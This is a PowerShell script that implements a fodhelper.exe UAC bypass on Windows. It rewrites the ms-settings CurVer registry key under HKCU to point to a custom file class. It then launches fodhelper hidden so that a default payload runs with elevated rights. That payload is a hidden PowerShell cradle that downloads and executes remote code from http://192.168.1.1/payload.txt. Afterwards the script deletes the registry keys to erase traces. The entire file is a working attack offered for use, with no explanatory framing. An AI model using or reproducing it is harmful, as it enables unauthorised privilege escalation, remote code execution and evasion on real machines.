function invoke-fodhelper { 
    Param (    
        [String]$program = 'Powershell -WindowStyle Hidden iex (new-object net.webclient).downloadstring(''http://192.168.1.1/payload.txt'')'
             
        
         
    )
    
    
    New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
    Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value "" -Force

    New-Item "HKCU:\Software\Classes\.sanjeet\Shell\Open\command" -Force
    Set-ItemProperty "HKCU:\Software\Classes\.sanjeet\Shell\Open\command" -Name "(default)" -Value $program -Force

    Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".sanjeet" -Force
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    Start-Sleep 3
    
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
    Remove-Item "HKCU:\Software\Classes\.sanjeet\" -Recurse -Force
}
